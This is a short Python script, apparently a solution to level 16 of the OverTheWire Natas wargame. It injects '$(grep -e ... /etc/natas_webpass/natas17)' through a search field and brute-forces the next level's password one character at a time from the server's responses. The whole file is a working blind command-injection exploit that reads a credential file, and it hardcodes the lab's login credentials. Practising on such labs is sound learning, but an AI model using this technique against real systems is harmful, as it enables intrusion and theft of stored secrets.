#!/bin/python3

import requests
import re
from bs4 import BeautifulSoup

def urlcon(var) :
    url = 'http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-e+' + var + '+%2Fetc%2Fnatas_webpass%2Fnatas17%29Africa&submit=Search'
    headers = {'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='}
    #needleval1 = '$(grep -e ' 
    #needleval2 = ' /etc/natas_webpass/natas17)'
    #payload = {'needle' : needleval1 , 'submit' : 'Search' }
    #print (urllib.parse.urlencode(needleval1))
    #print (urllib.parse.urlencode(needleval2))
    r = requests.get(url,auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
    #print (r.text)
    soup=BeautifulSoup(r.text, 'html.parser')
    #print (soup.prettify())
    #return (soup.find_all('pre', text=True))
    return (soup.pre.text)

lst = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'

str1 = '^'



for i in range(1,33) :
    for j in lst :
        teststr = str1 + j
        print (teststr)
        if (len(urlcon(teststr))) <= 1 :
            str1 = teststr
            break
        

